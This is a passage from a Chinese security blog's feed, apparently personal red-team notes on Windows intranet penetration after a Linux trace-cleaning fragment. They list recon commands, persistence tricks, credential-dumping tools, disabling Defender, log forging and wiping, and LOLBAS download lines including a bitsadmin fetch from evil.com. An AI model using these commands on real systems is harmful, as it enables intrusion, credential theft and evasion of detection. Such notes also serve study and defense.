-i</code></li>\n</ul>\n</li>\n</ul>\n<h2 id=\"覆写文件\"><a class=\"anchor\" href=\"#覆写文件\">#</a> 覆写文件</h2>\n<ul>\n<li>shred</li>\n<li>dd</li>\n<li>wipe</li>\n</ul>\n<h2 id=\"难点\"><a class=\"anchor\" href=\"#难点\">#</a> 难点</h2>\n<ul>\n<li>攻击和入侵很难完全删除痕迹，没有日志记录也是一种特征</li>\n<li>即使删除本地日志，在网络设备、安全设备、集中化日志系统中仍有记录</li>\n<li>留存的后门包含攻击者的信息</li>\n<li>使用的代理或跳板可能会被反向入侵</li>\n</ul>\n<h2 id=\"注意\"><a class=\"anchor\" href=\"#注意\">#</a> 注意</h2>\n<ul>\n<li>在操作前检查是否有用户在线</li>\n<li>删除文件使用磁盘覆写的功能删除</li>\n<li>尽量和攻击前状态保持一致</li>\n</ul>\n<h2 id=\"参考链接\"><a class=\"anchor\" href=\"#参考链接\">#</a> 参考链接</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvaTJXdkZtRjFxUWpieC1CYVN0WGIxUQ==\">Linux 入侵痕迹清理技巧</span></li>\n</ul>\n",
            "tags": [
                "渗透",
                "Linux",
                "信息收集",
                "痕迹清理"
            ]
        },
        {
            "id": "https://mobius-0.github.io/security/WebNote/Intranet%20penetration/Windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/",
            "url": "https://mobius-0.github.io/security/WebNote/Intranet%20penetration/Windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/",
            "title": "Windows内网渗透",
            "date_published": "2022-11-28T03:20:20.000Z",
            "content_html": "<h1 id=\"信息收集\"><a class=\"anchor\" href=\"#信息收集\">#</a> 信息收集</h1>\n<h2 id=\"基本命令\"><a class=\"anchor\" href=\"#基本命令\">#</a> 基本命令</h2>\n<ul>\n<li>主机名  <code>hostname</code></li>\n<li>查询所有计算机名称  <code>dsquery computer</code></li>\n<li>查看配置及补丁信息\n<ul>\n<li><code>systeminfo</code></li>\n<li><code>wmic qfe get description,installedOn /format:csv</code></li>\n</ul>\n</li>\n<li>查看版本  <code>ver</code></li>\n<li>进程信息\n<ul>\n<li><code>tasklist /svc</code></li>\n<li><code>wmic process get caption,executablepath,commandline /format:csv</code></li>\n<li><code>get-process</code></li>\n</ul>\n</li>\n<li>查看所有环境变量  <code>set</code></li>\n<li>查看计划任务  <code>schtasks /QUERY /fo LIST /v</code></li>\n<li>查看安装驱动  <code>DRIVERQUERY</code></li>\n<li>查看操作系统信息\n<ul>\n<li>架构  <code>wmic os get osarchitecture</code></li>\n<li>系统名  <code>wmic os get caption</code></li>\n</ul>\n</li>\n<li>查看逻辑盘  <code>wmic logicaldisk get caption</code></li>\n<li>查看安装的软件信息  <code>wmic product get name,version</code></li>\n<li>查看服务信息\n<ul>\n<li><code>wmic service list brief</code></li>\n<li><code>sc query</code></li>\n<li><code>Get-WmiObject win32_service | select PathName</code></li>\n</ul>\n</li>\n</ul>\n<h2 id=\"域信息\"><a class=\"anchor\" href=\"#域信息\">#</a> 域信息</h2>\n<ul>\n<li>获取当前组的计算机名  <code>net view</code></li>\n<li>网络发现  <code>net view /all</code></li>\n<li>查看所有域  <code>net view /domain</code></li>\n<li>域森林、域树信息</li>\n<li>域信任信息  <code>nltest /domain_trusts</code></li>\n<li>定位域控  <code>net time /domain</code></li>\n<li>查看域中的用户名  <code>dsquery user</code></li>\n<li>查询域组名称  <code>net group /domain</code></li>\n<li>查询域管理员  <code>net group &quot;Domain Admins&quot; /domain</code></li>\n<li>域控信息\n<ul>\n<li><code>nltest /dclist:xx</code></li>\n<li><code>Get-NetDomain</code></li>\n<li><code>Get-NetDomainController</code></li>\n<li><code>net group &quot;Domain controllers&quot;</code></li>\n</ul>\n</li>\n<li>组策略</li>\n</ul>\n<h2 id=\"用户信息\"><a class=\"anchor\" href=\"#用户信息\">#</a> 用户信息</h2>\n<ul>\n<li>查看用户\n<ul>\n<li><code>net user</code></li>\n<li><code>whoami</code>  /  <code>whoami /priv</code>  /  <code>whoami /all</code></li>\n<li><code>wmic useraccount get /ALL /format:csv</code></li>\n</ul>\n</li>\n<li>用户特权信息  <code>whoami /priv</code></li>\n<li>查看当前权限  <code>net localgroup administrators</code></li>\n<li>查看在线用户  <code>quser</code>  /  <code>qwinsta</code>  /  <code>query user</code></li>\n<li>查看当前计算机名，全名，用户名，系统版本，工作 站域，登陆域  <code>net config Workstation</code></li>\n<li>ACL 信息  <code>get-acl</code></li>\n</ul>\n<h2 id=\"网络信息\"><a class=\"anchor\" href=\"#网络信息\">#</a> 网络信息</h2>\n<ul>\n<li>内网网段信息</li>\n<li>网卡信息  <code>ipconfig</code></li>\n<li>外网出口</li>\n<li>ARP 表  <code>arp -a</code></li>\n<li>路由表  <code>route print</code></li>\n<li>监听的端口  <code>netstat -ano</code></li>\n<li>连接的端口</li>\n<li>端口信息\n<ul>\n<li><code>Get-NetTCPConnection</code></li>\n</ul>\n</li>\n<li>hosts 文件</li>\n<li>主备 DNS</li>\n<li>DNS 缓存\n<ul>\n<li><code>ipconfig /displaydns</code></li>\n<li><code>Get-CimInstance -Namespace root/StandardCimv2 -ClassName MSFT_DNSClientCache</code></li>\n</ul>\n</li>\n<li>探测出网情况\n<ul>\n<li>powershell -c &quot;1..65535 | % {echo ((new-object Net.Sockets.TcpClient).Connect('allports.exposed',$_)) _ } 2>null&quot;</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"防火墙\"><a class=\"anchor\" href=\"#防火墙\">#</a> 防火墙</h2>\n<ul>\n<li>查看防火墙状态  <code>netsh advfirewall show allprofiles</code></li>\n<li>防火墙日志目录  <code>netsh firewall show logging</code></li>\n<li>防火墙规则  <code>netsh advfirewall firewall show rule name=all</code></li>\n<li><code>netsh firewall show config</code></li>\n<li><code>netsh firewall show state</code></li>\n</ul>\n<h2 id=\"密码信息\"><a class=\"anchor\" href=\"#密码信息\">#</a> 密码信息</h2>\n<ul>\n<li>Windows RDP 连接记录</li>\n<li>浏览器中保存的账号密码</li>\n<li>系统密码管理器中的各种密码</li>\n<li>无人值守安装文件中的密码信息\n<ul>\n<li><code>C:\\sysprep.inf</code></li>\n<li><code>C:\\sysprep\\sysprep.xml</code></li>\n<li><code>C:\\Windows\\Panther\\Unattend\\Unattended.xml</code></li>\n<li><code>C:\\Windows\\Panther\\Unattended.xml</code></li>\n</ul>\n</li>\n</ul>\n<h2 id=\"票据信息\"><a class=\"anchor\" href=\"#票据信息\">#</a> 票据信息</h2>\n<ul>\n<li><code>cmdkey /l</code></li>\n<li>klist</li>\n<li>msf meterpreter</li>\n</ul>\n<h2 id=\"特殊文件\"><a class=\"anchor\" href=\"#特殊文件\">#</a> 特殊文件</h2>\n<ul>\n<li>文档\n<ul>\n<li>xlsx / xls</li>\n<li>docx / doc</li>\n<li>pptx / ppt</li>\n<li>vsdx / vsd</li>\n<li>md / txt</li>\n</ul>\n</li>\n<li>压缩文件\n<ul>\n<li>zip / rar / 7z</li>\n</ul>\n</li>\n<li>VPN 配置\n<ul>\n<li>ovpn</li>\n</ul>\n</li>\n<li>代码\n<ul>\n<li>py / php / jsp / aspx / asp / sql</li>\n</ul>\n</li>\n<li>配置文件\n<ul>\n<li>conf / ini / xml</li>\n</ul>\n</li>\n<li>特定关键字\n<ul>\n<li>账号 / 账户 / 登录 /login/user</li>\n<li>密码 /pass</li>\n<li>代码 / 文档 / 交接 / 备份 /git/svn</li>\n<li>邮箱 / 通讯录 / 集群 / 办公</li>\n<li>代理 / 内网 / VPN</li>\n<li>设备 / 资产</li>\n<li>系统 / 运维 / 拓扑 / 网络 / IT</li>\n<li>后台 / 管理员 / 数据库</li>\n<li>监控 / 隔离 / 防火墙 / 网闸 / 巡检</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"局域网存活主机\"><a class=\"anchor\" href=\"#局域网存活主机\">#</a> 局域网存活主机</h2>\n<ul>\n<li>NetBIOS 扫描</li>\n<li>OXID 扫描</li>\n</ul>\n<h2 id=\"其他\"><a class=\"anchor\" href=\"#其他\">#</a> 其他</h2>\n<ul>\n<li>启用的共享文件夹</li>\n<li>回收站</li>\n<li>最近运行的命令</li>\n<li>访问文件历史记录</li>\n<li>查看补丁安装情况\n<ul>\n<li><code>wmic qfe get Caption,Description,HotFixID,InstalledOn</code></li>\n</ul>\n</li>\n<li>日志与事件信息\n<ul>\n<li><code>wevtutil</code></li>\n<li><code>eventvwr</code></li>\n</ul>\n</li>\n<li>注册表信息\n<ul>\n<li><code>reg</code></li>\n</ul>\n</li>\n<li>安装的各类 agent 监控软件</li>\n<li>安装的杀毒软件</li>\n<li>查看 / 设置后缀关联\n<ul>\n<li><code>assoc</code></li>\n<li><code>assoc .ext=example</code></li>\n</ul>\n</li>\n<li>PowerShell 版本</li>\n<li>.Net 版本</li>\n<li>Wi-Fi 密码</li>\n</ul>\n<h1 id=\"持久化\"><a class=\"anchor\" href=\"#持久化\">#</a> 持久化</h1>\n<h2 id=\"隐藏文件\"><a class=\"anchor\" href=\"#隐藏文件\">#</a> 隐藏文件</h2>\n<ul>\n<li>创建系统隐藏文件\n<ul>\n<li><code>attrib +s +a +r +h filename</code>  /  <code>attrib +s +h filename</code></li>\n</ul>\n</li>\n<li>利用 NTFS ADS (Alternate　Data　Streams) 创建隐藏文件</li>\n<li>利用 Windows 保留字\n<ul>\n<li><code>aux|prn|con|nul|com1|com2|com3|com4|com5|com6|com7|com8|com9|lpt1|lpt2|lpt3|lpt4|lpt5|lpt6|lpt7|lpt8|lpt9</code></li>\n</ul>\n</li>\n</ul>\n<h2 id=\"后门\"><a class=\"anchor\" href=\"#后门\">#</a> 后门</h2>\n<h3 id=\"sethc\"><a class=\"anchor\" href=\"#sethc\">#</a> sethc</h3>\n<p><code>sethc.exe</code>  是 Windows 系统在用户按下五次 shift 后调用的粘滞键处理程序，当有写文件但是没有执行权限时，可以通过替换  <code>sethc.exe</code>  的方式留下后门，在密码输入页面输入五次 shift 即可获得权限。</p>\n<h3 id=\"映像劫持\"><a class=\"anchor\" href=\"#映像劫持\">#</a> 映像劫持</h3>\n<p>在高版本的 Windows 中，替换程序是受到系统保护的，需要使用其他的技巧来实现替换。</p>\n<p>具体操作为在注册表的  <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Option</code>  下添加项  <code>sethc.exe</code>  ，然后在  <code>sethc.exe</code>  这个项中添加  <code>debugger</code>  键，键值为恶意程序的路径。</p>\n<h3 id=\"定时任务\"><a class=\"anchor\" href=\"#定时任务\">#</a> 定时任务</h3>\n<p>Windows 下有  <code>schtasks</code>  和  <code>at</code>  两种计划任务机制。 其中  <code>at</code>  在较高版本的 Windows 中已经弃用。</p>\n<p>设置命令为  <code>schtasks /create /tn &quot;TEST_OnLogon&quot; /sc onlogon /tr &quot;cmd.exe /c calc.exe&quot;</code>  、  <code>schtasks /create /tn &quot;TEST_OnStartup&quot; /sc onstart /ru system /tr &quot;cmd.exe /c calc.exe&quot;</code>  。删除命令为  <code>schtasks /delete /tn &quot;TEST_OnLogon&quot; /f</code>  。</p>\n<h3 id=\"登录脚本\"><a class=\"anchor\" href=\"#登录脚本\">#</a> 登录脚本</h3>\n<p>Windows 可以在用户登录前执行脚本，使用  <code>HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit</code>  设置。</p>\n<p>也可在  <code>HKCU\\Environment\\</code>  路径下设置  <code>UserInitMprLogonScript</code>  来实现。</p>\n<h3 id=\"屏幕保护程序\"><a class=\"anchor\" href=\"#屏幕保护程序\">#</a> 屏幕保护程序</h3>\n<p>Windows 可以自定义屏幕保护程序，使用  <code>HKEY_CURRENT_USER\\Control Panel\\Desktop</code>  设置。</p>\n<h3 id=\"隐藏用户\"><a class=\"anchor\" href=\"#隐藏用户\">#</a> 隐藏用户</h3>\n<p>Windows 可以使用在用户名后加入  <code>$</code>  来创建隐藏用户，这种帐户可在一定条件下隐藏，但是仍可以通过控制面板查看。</p>\n<p>在创建隐藏用户的基础上，可以修改注册表的方式创建影子用户，这种方式创建的用户只能通过注册表查看。</p>\n<h3 id=\"clr\"><a class=\"anchor\" href=\"#clr\">#</a> CLR</h3>\n<p>CLR (Common Language Runtime Compilation) 公共语言运行时，是微软为.NET 产品构建的运行环境，可以粗略地理解为.NET 虚拟机。</p>\n<p>.NET 程序的运行离不开 CLR，因此可以通过劫持 CLR 的方式实现后门。</p>\n<h3 id=\"winlogon-helper-dll后门\"><a class=\"anchor\" href=\"#winlogon-helper-dll后门\">#</a> Winlogon Helper DLL 后门</h3>\n<p>Winlogon 是一个 Windows 组件，用来处理各种活动，如登录、注销、身份验证期间加载用户配置文件、关闭、锁定屏幕等。这种行为由注册表管理，该注册表定义在 Windows 登录期间启动哪些进程。所以可以依靠这个注册表来进行权限维持。</p>\n<p>注册表位置如下：</p>\n<ul>\n<li><code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell</code>  用于执行 exe 程序</li>\n<li><code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit</code>  用于执行 exe 程序</li>\n<li><code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify</code>  用于执行 dll 文件</li>\n</ul>\n<h2 id=\"自启动\"><a class=\"anchor\" href=\"#自启动\">#</a> 自启动</h2>\n<h3 id=\"基于注册表的自启动\"><a class=\"anchor\" href=\"#基于注册表的自启动\">#</a> 基于注册表的自启动</h3>\n<p>通过在注册表中写入相应的键值可以实现程序的开机自启动，主要是  <code>Run</code>  和  <code>RunOnce</code>  ，其中 RunOnce 和 Run 区别在于 RunOnce 的键值只作用一次，执行完毕后会自动删除。</p>\n<p>注册表如下：</p>\n<ul>\n<li><code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code></li>\n<li><code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code></li>\n<li><code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code></li>\n<li><code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code></li>\n<li><code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx</code></li>\n</ul>\n<p>基于策略的自启动注册表设置如下：</p>\n<ul>\n<li><code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code></li>\n<li><code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code></li>\n</ul>\n<p>设置启动文件夹注册表位置如下：</p>\n<ul>\n<li><code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code></li>\n<li><code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code></li>\n<li><code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code></li>\n<li><code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code></li>\n</ul>\n<p>设置服务启动项注册表位置如下：</p>\n<ul>\n<li><code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code></li>\n<li><code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code></li>\n<li><code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code></li>\n<li><code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code></li>\n</ul>\n<p>用户自启动位置  <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit</code>  、  <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell</code>  ，其中  <code>Userinit</code>  键允许指定用逗号分隔的多个程序。</p>\n<p>如果用户启动了屏幕保护程序，也可以通过屏幕保护程序来启动后面，相关注册表键值为：</p>\n<ul>\n<li><code>HKEY_CURRENT_USER\\Control Panel\\Desktop\\ScreenSaveActive</code></li>\n<li><code>HKEY_CURRENT_USER\\Control Panel\\Desktop\\ScreenSaverIsSecure</code></li>\n<li><code>HKEY_CURRENT_USER\\Control Panel\\Desktop\\ScreenSaveTimeOut</code></li>\n<li><code>HKEY_CURRENT_USER\\Control Panel\\Desktop\\SCRNSAVE.EXE</code></li>\n</ul>\n<h3 id=\"基于特定目录的自启动\"><a class=\"anchor\" href=\"#基于特定目录的自启动\">#</a> 基于特定目录的自启动</h3>\n<p>自启动目录，  <code>C:\\Users\\Username\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup</code>  目录对特定用户生效，  <code>C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp</code>  对所有用户生效。在 NT6 以前，两个目录为  <code>C:\\Documents and Settings\\Username\\Start Menu\\Programs\\StartUp</code>  /  <code>C:\\Documents and Settings\\All Users\\Start Menu\\Programs\\StartUp</code>  。</p>\n<h1 id=\"权限\"><a class=\"anchor\" href=\"#权限\">#</a> 权限</h1>\n<h2 id=\"uac\"><a class=\"anchor\" href=\"#uac\">#</a> UAC</h2>\n<h3 id=\"简介\"><a class=\"anchor\" href=\"#简介\">#</a> 简介</h3>\n<p>UAC (User Account Control) 是 Windows Vista 和 Windows Server 2008 引入的一个安全机制，当一些敏感操作发生时，会跳出提示显式要求系统权限。</p>\n<p>当用户登陆 Windows 时，每个用户都会被授予一个 access token，这个 token 中有 security identifier (SID) 的信息，决定了用户的权限。</p>\n<h3 id=\"会触发uac的操作\"><a class=\"anchor\" href=\"#会触发uac的操作\">#</a> 会触发 UAC 的操作</h3>\n<ul>\n<li>以管理员权限启动应用</li>\n<li>修改系统、UAC 设置</li>\n<li>修改没有权限的文件或者目录（ % SystemRoot% / % ProgramFiles% 等 ）</li>\n<li>修改 ACL (access control list)</li>\n<li>安装驱动</li>\n<li>增删账户，修改账户类型，激活来宾账户</li>\n</ul>\n<h3 id=\"bypass\"><a class=\"anchor\" href=\"#bypass\">#</a> ByPass</h3>\n<ul>\n<li>DLL 相关</li>\n<li>进程注入</li>\n<li>注册表</li>\n</ul>\n<h2 id=\"权限提升\"><a class=\"anchor\" href=\"#权限提升\">#</a> 权限提升</h2>\n<p>权限提升有多重方式，有利用二进制漏洞、逻辑漏洞等技巧。利用二进制漏洞获取权限的方式是利用运行在内核态中的漏洞来执行代码。比如内核、驱动中的 UAF 或者其他类似的漏洞，以获得较高的权限。</p>\n<p>逻辑漏洞主要是利用系统的一些逻辑存在问题的机制，比如有些文件夹用户可以写入，但是会以管理员权限启动。</p>\n<h3 id=\"任意写文件利用\"><a class=\"anchor\" href=\"#任意写文件利用\">#</a> 任意写文件利用</h3>\n<p>在 Windows 中用户可以写的敏感位置主要有以下这些</p>\n<ul>\n<li>用户自身的文件和目录，包括  <code>AppData</code>   <code>Temp</code></li>\n<li><code>C:\\</code>  ，默认情况下用户可以写入</li>\n<li><code>C:\\ProgramData</code>  的子目录，默认情况下用户可以创建文件夹、写入文件</li>\n<li><code>C:\\Windows\\Temp</code>  的子目录，默认情况下用户可以创建文件夹、写入文件</li>\n</ul>\n<p>具体的 ACL 信息可用 AccessChk, 或者 PowerShell 的  <code>Get-Acl</code>  命令查看。</p>\n<p>可以利用对这些文件夹及其子目录的写权限，写入一些可能会被加载的 dll，利用 dll 的加载执行来获取权限。</p>\n<h3 id=\"mof\"><a class=\"anchor\" href=\"#mof\">#</a> MOF</h3>\n<p>MOF 是 Windows 系统的一个文件（  <code>c:/windows/system32/wbem/mof/nullevt.mof</code>  ）叫做 &quot;托管对象格式&quot;，其作用是每隔五秒就会去监控进程创建和死亡。</p>\n<p>当拥有文件上传的权限但是没有 Shell 时，可以上传定制的 mof 文件至相应的位置，一定时间后这个 mof 就会被执行。</p>\n<p>一般会采用在 mof 中加入一段添加管理员用户的命令的 vbs 脚本，当执行后就拥有了新的管理员账户。</p>\n<h3 id=\"凭证窃取\"><a class=\"anchor\" href=\"#凭证窃取\">#</a> 凭证窃取</h3>\n<ul>\n<li>Windows 本地密码散列导出工具\n<ul>\n<li>mimikatz</li>\n<li>lsass</li>\n<li>wce</li>\n<li>gsecdump</li>\n<li>copypwd</li>\n<li>Pwdump</li>\n<li>ProcDump：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLm1pY3Jvc29mdC5jb20vZW4tdXMvc3lzaW50ZXJuYWxzL2Rvd25sb2Fkcy9wcm9jZHVtcA==\">https://docs.microsoft.com/en-us/sysinternals/downloads/procdump</span></li>\n</ul>\n</li>\n<li>Windows 本地密码破解工具\n<ul>\n<li>L0phtCrack</li>\n<li>SAMInside</li>\n<li>Ophcrack</li>\n</ul>\n</li>\n<li>彩虹表破解</li>\n<li>本机 hash + 明文抓取</li>\n<li>win8+win2012 明文抓取</li>\n<li>ntds.dit 的导出 + QuarkPwDump 读取分析</li>\n<li>vssown.vbs + libesedb + NtdsXtract</li>\n<li>ntdsdump</li>\n<li>利用 powershell (DSInternals) 分析 hash</li>\n<li>使用  <code>net use \\\\%computername% /u:%username%</code>  重置密码尝试次数</li>\n<li>限制读取时，可 crash 操作系统后，在蓝屏的 dump 文件中读取</li>\n</ul>\n<h3 id=\"其他-2\"><a class=\"anchor\" href=\"#其他-2\">#</a> 其他</h3>\n<ul>\n<li>组策略首选项漏洞</li>\n<li>DLL 劫持</li>\n<li>替换系统工具，实现后门</li>\n<li>关闭 defender\n<ul>\n<li><code>Set-MpPreference -disablerealtimeMonitoring $true</code></li>\n</ul>\n</li>\n</ul>\n<h1 id=\"痕迹清理\"><a class=\"anchor\" href=\"#痕迹清理\">#</a> 痕迹清理</h1>\n<h2 id=\"日志\"><a class=\"anchor\" href=\"#日志\">#</a> 日志</h2>\n<ul>\n<li>查看日志  <code>eventvwr</code></li>\n<li>伪造日志  <code>eventcreate</code></li>\n<li>操作日志\n<ul>\n<li>3389 登录列表</li>\n<li>文件打开日志</li>\n<li>文件修改日志</li>\n<li>浏览器日志</li>\n<li>系统事件</li>\n<li>程序安装记录</li>\n<li>程序删除记录</li>\n<li>程序更新记录</li>\n</ul>\n</li>\n<li>登录日志\n<ul>\n<li>系统安全日志</li>\n</ul>\n</li>\n<li>日志路径\n<ul>\n<li>系统日志：  <code>%SystemRoot%\\System32\\Winevt\\Logs\\System.evtx</code></li>\n<li>安全日志：  <code>%SystemRoot%\\System32\\Winevt\\Logs\\Security.evtx</code></li>\n<li>应用程序日志：  <code>%SystemRoot%\\System32\\Winevt\\Logs\\Application.evtx</code></li>\n</ul>\n</li>\n<li>服务日志\n<ul>\n<li>IIS：  <code>%SystemDrive%\\inetpub\\logs\\LogFiles\\W3SVC1\\</code></li>\n</ul>\n</li>\n</ul>\n<h2 id=\"注册表\"><a class=\"anchor\" href=\"#注册表\">#</a> 注册表</h2>\n<ul>\n<li>AppCompatFlags</li>\n<li>Background Activity Moderator (BAM)</li>\n<li>MuiCache</li>\n<li>RecentApps</li>\n<li>RunMRU</li>\n<li>ShimCache (AppCompatCache)</li>\n</ul>\n<h3 id=\"注册表键\"><a class=\"anchor\" href=\"#注册表键\">#</a> 注册表键</h3>\n<ul>\n<li>HKEY_LOCAL_MACHINEsystemCurrentControlSetServicesEventlog</li>\n</ul>\n<h2 id=\"文件\"><a class=\"anchor\" href=\"#文件\">#</a> 文件</h2>\n<h3 id=\"prefetch\"><a class=\"anchor\" href=\"#prefetch\">#</a> Prefetch</h3>\n<p>预读取文件夹，用来存放系统已访问过的文件的预读信息，扩展名为 PF。位置在  <code>C:\\Windows\\Prefetch</code>  。</p>\n<h3 id=\"jumplists\"><a class=\"anchor\" href=\"#jumplists\">#</a> JumpLists</h3>\n<p>记录用户最近使用的文档和应用程序，方便用户快速跳转到指定文件，位置在  <code>%APPDATA%\\Microsoft\\Windows\\Recent</code>  。</p>\n<h3 id=\"amcache-recentfilecachebcf\"><a class=\"anchor\" href=\"#amcache-recentfilecachebcf\">#</a> Amcache / RecentFileCache.bcf</h3>\n<p>Windows 中的使用这两个文件来跟踪具有不同可执行文件的应用程序兼容性问题，它可用于确定可执行文件首次运行的时间和最后修改时间。</p>\n<p>在 Windows 7、Windows Server 2008 R2 等系统中，文件保存在  <code>C:\\Windows\\AppCompat\\Programs\\RecentFileCache.bcf</code>  ，包含程序的创建时间、上次修改时间、上次访问时间和文件名。</p>\n<p>在 Windows 8、Windows 10、Windows Server 2012 等系统中，文件保存在  <code>C:\\Windows\\AppCompat\\Programs\\Amcache.hve</code>  ，包含文件大小、版本、sha1、二进制文件类型等信息。</p>\n<h2 id=\"时间轴\"><a class=\"anchor\" href=\"#时间轴\">#</a> 时间轴</h2>\n<p>Windows 时间轴是 Windows 10 在 1803 版中引入的一个新特性，会记录访问过的网站、编辑过的文档、运行的程序等，</p>\n<h2 id=\"彻底删除\"><a class=\"anchor\" href=\"#彻底删除\">#</a> 彻底删除</h2>\n<ul>\n<li>多次覆写文件  <code>cipher /w:&lt;path&gt;</code></li>\n<li>格式化某磁盘 count 次  <code>format D: /P:&lt;count&gt;</code></li>\n</ul>\n<h1 id=\"横向移动\"><a class=\"anchor\" href=\"#横向移动\">#</a> 横向移动</h1>\n<h2 id=\"常见入口\"><a class=\"anchor\" href=\"#常见入口\">#</a> 常见入口</h2>\n<ul>\n<li>SMB 弱密码</li>\n<li>SqlServer 弱密码</li>\n</ul>\n<h2 id=\"lolbas\"><a class=\"anchor\" href=\"#lolbas\">#</a> LOLBAS</h2>\n<h3 id=\"简介-2\"><a class=\"anchor\" href=\"#简介-2\">#</a> 简介</h3>\n<p>LOLBAS，全称 Living Off The Land Binaries and Scripts (and also Libraries)，是一种白利用方式，是在 2013 年 DerbyCon 由 Christopher Campbell 和 Matt Graeber 发现，最终 Philip Goh 提出的概念。</p>\n<p>这些程序一般有有 Microsoft 或第三方认证机构的签名，但是除了可以完成正常的功能，也能够被用于内网渗透中。这些程序可能会被用于：下载安全恶意程序、执行恶意代码、绕过 UAC、绕过程序控制等。</p>\n<h3 id=\"常见程序\"><a class=\"anchor\" href=\"#常见程序\">#</a> 常见程序</h3>\n<ul>\n<li>\n<p>appsyncvpublishing.exe</p>\n<ul>\n<li>执行 powershell</li>\n</ul>\n</li>\n<li>\n<p>bitsadmin.exe</p>\n<ul>\n<li>下载文件  <code>bitsadmin /transfer &lt;job_name&gt; /priority &lt;priority&gt; &lt;remote_path&gt; &lt;local_path&gt;</code></li>\n<li>下载文件  <code>bitsadmin /create 1 bitsadmin /addfile 1 https://evil.com/autoruns.exe c:\\data\\playfolder\\autoruns.exe bitsadmin /RESUME 1 bitsadmin /complete 1</code></li>\n<li>复制文件  <code>bitsadmin /create 1 &amp; bitsadmin /addfile 1 c:\\windows\\system32\\cmd.exe c:\\data\\playfolder\\cmd.exe &amp; bitsadmin /RESUME 1 &amp; bitsadmin /Complete 1 &amp; bitsadmin /reset</code></li>\n<li>代码执行  <code>bitsadmin /create 1 &amp; bitsadmin /addfile 1 c:\\windows\\system32\\cmd.exe c:\\data\\playfolder\\cmd.exe &amp; bitsadmin /SetNotifyCmdLine 1 c:\\data\\playfolder\\cmd.exe NULL &amp; bitsadmin /RESUME 1 &amp; bitsadmin /Reset</code></li>\n</ul>\n</li>\n<li>\n<p>cdb.exe</p>\n</li>\n<li>\n<p>certutil.exe</p>\n<ul>\n<li>可安装、备份、删除、管理和执行</li>\n<li>证书证书存储相关功能</li>\n<li>下载文件  <code>certutil -urlcache -split -f https://addr/example.exe</code></li>\n<li>注意 certutil 是有 cache 的，需要显式删除</li>\n<li>base64 编解码  <code>certutil -encode</code>  /  <code>certutil -decode</code></li>\n</ul>\n</li>\n<li>\n<p>cmd.exe</p>\n</li>\n<li>\n<p>cmstp.exe</p>\n</li>\n<li>\n<p>control.exe</p>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZGVhcmJ5dGVzLmNvbS9ibG9nL3BsYXlpbmctYXJvdW5kLXdpdGgtbnNhLWhhY2tpbmctdG9vbHMv\">加载 dll</span></li>\n</ul>\n</li>\n<li>\n<p>csc.exe</p>\n<ul>\n<li>编译 C# 载荷</li>\n</ul>\n</li>\n<li>\n<p>cscript.exe</p>\n<ul>\n<li>执行脚本</li>\n</ul>\n</li>\n<li>\n<p>extexport.exe</p>\n</li>\n<li>\n<p>expand.exe</p>\n<ul>\n<li>展开一个或多个压缩文件</li>\n</ul>\n</li>\n<li>\n<p>forfiles.exe</p>\n<ul>\n<li><code>forfiles /p c:\\windows\\system32 /m notepad.exe /c calc.exe</code></li>\n</ul>\n</li>\n<li>\n<p>mofcomp.exe</p>\n</li>\n<li>\n<p>makecab.exe</p>\n</li>\n<li>\n<p>msbuild.exe</p>\n<ul>\n<li>构建应用程序</li>\n</ul>\n</li>\n<li>\n<p>mshta.exe</p>\n<ul>\n<li>HTML 应用</li>\n</ul>\n</li>\n<li>\n<p>msiexec.exe</p>\n<ul>\n<li>安装 msi</li>\n<li>加载 dll</li>\n</ul>\n</li>\n<li>\n<p>msxsl.exe</p>\n<ul>\n<li>处理 XSL 